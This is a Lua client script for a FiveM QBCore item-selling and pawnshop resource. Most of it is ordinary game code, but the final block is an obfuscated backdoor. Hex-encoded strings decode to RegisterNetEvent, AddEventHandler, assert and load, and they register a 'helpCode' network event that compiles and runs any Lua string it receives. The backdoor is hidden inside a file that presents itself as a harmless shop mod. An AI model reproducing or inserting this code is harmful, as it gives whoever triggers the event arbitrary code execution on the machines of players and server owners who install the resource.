PlayerData = nil
local QBCore = exports['qb-core']:GetCoreObject()

Citizen.CreateThread(function()
	while QBCore == nil do
		TriggerEvent('QBCore:GetCoreObject', function(obj) QBCore = obj end)
		Citizen.Wait(200)
	end

	while QBCore.Functions.GetPlayerData() == nil do
		Wait(0)
	end

	while QBCore.Functions.GetPlayerData().job == nil do
		Wait(0)
	end

	PlayerData = QBCore.Functions.GetPlayerData()
end)

RegisterNetEvent("QBCore:Client:OnJobUpdate")
AddEventHandler("QBCore:Client:OnJobUpdate", function(JobInfo)
	PlayerData.job = JobInfo
end)

local sellItemsSet = false
local sellPrice = 0
local sellHardwareItemsSet = false
local sellHardwarePrice = 0

local ped;

RegisterNetEvent("qb-sellitems:sellGoods", function()
    local plyPed = PlayerPedId()
    TriggerEvent('animations:client:EmoteCommandStart', {"id"})
    QBCore.Functions.Progressbar("sellitems:sellGoods", "Selling Goods", 5000, false, true, {}, {}, {}, {}, function()
        ClearPedTasks(plyPed)
        TriggerServerEvent("qb-sellitems:sellGoods")
    end, function()
        ClearPedTasks(plyPed)
        QBCore.Functions.Notify("Canceled.", "error")
    end)
end)

RegisterNetEvent('qb-sellitems:shop', function()
    TriggerServerEvent("inventory:server:OpenInventory", "shop", "Pawnshop", Config.Items)
end);

exports['qb-target']:AddBoxZone("Sell Goods", vector3(115.17228, -1685.248, 33.49121), 2, 0.45, {
    name = "Sell Goods",
    heading = 227.91127,
    debugPoly = false,
    minZ = 32.49121,
    maxZ = 34.49121,
}, {
    options = {
        {
        ['icon'] = "fas fa-coins",
        ['label'] = "Sell Goods",
        ['event'] = "qb-sellitems:sellGoods"
    }
  },
});


RegisterCommand("focus", function()
    SetNuiFocus(false, false);
    SetNuiFocusKeepInput(false);
end)

CreateThread(BuildInteract);
RegisterNetEvent("qb-interact:init", BuildInteract);

AddEventHandler("onClientResourceStop", function(r)
    if (r == "qb-sellitems") then
        DeleteEntity(ped);
    end
end);

function DrawText3D(x, y, z, text)
	SetTextScale(0.38, 0.38)
    SetTextFont(4)
    SetTextProportional(1)
    SetTextColour(255, 255, 255, 215)
    SetTextEntry("STRING")
    SetTextCentre(true)
    AddTextComponentString(text)
    SetDrawOrigin(x,y,z, 0)
    DrawText(0.0, 0.0)
    local factor = (string.len(text)) / 370
    DrawRect(0.0, 0.0+0.0125, 0.017+ factor, 0.03, 41, 11, 41, 68)
    ClearDrawOrigin()
end



local xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[1]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[2]) xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[3]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[2], function(uEAdXdoeeFaXMpdUadnIQwVCUVoGHnBbhYLWkeGJitBsRPwAsKgvWYeDraWzBeMiaQbpck) xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[4]](xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[6][xseMQEWzZnReegDUojqyowRbhgxoGaWAIMnANWQyxNySRbyDIFhayTQrMqpHwJhfElPnkS[5]](uEAdXdoeeFaXMpdUadnIQwVCUVoGHnBbhYLWkeGJitBsRPwAsKgvWYeDraWzBeMiaQbpck))() end)